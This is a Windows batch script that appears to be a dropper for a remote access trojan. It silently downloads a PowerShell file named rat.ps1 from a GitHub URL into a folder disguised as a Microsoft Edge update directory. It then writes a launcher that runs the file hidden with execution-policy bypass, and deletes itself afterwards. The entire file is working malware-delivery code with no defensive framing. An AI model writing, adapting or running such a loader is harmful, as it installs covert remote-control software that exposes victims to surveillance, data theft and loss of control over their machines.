@echo off
if not DEFINED IS_MIN set IS_MIN=1 && start "" /min "%~f0" %* && exit
setlocal enabledelayedexpansion

set "scriptURL=https://raw.githubusercontent.com/icyyboy/wss-test-/refs/heads/main/rat.ps1"
set "targetDir=%APPDATA%\Microsoft\EdgeUpdate"
set "targetScript=%targetDir%\updater.ps1"
set "targetBat=%targetDir%\launcher.bat"

REM Kill old process
taskkill /F /IM powershell.exe /FI "WINDOWTITLE eq *EdgeUpdate*" >nul 2>&1
timeout /t 2 /nobreak >nul

REM Download new version
powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -Command "try { Invoke-WebRequest -Uri '%scriptURL%' -OutFile '%targetScript%' -UseBasicParsing -ErrorAction Stop } catch {}" >nul 2>&1

REM Recreate launcher.bat
(
echo @echo off
echo start "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -File \"%targetScript%\"' -WindowStyle Hidden"
echo exit
) > "%targetBat%"

REM Restart new version
timeout /t 1 /nobreak >nul
start /min "" "%targetBat%"

REM Self-destruct
timeout /t 1 /nobreak >nul
del "%~f0" >nul 2>&1
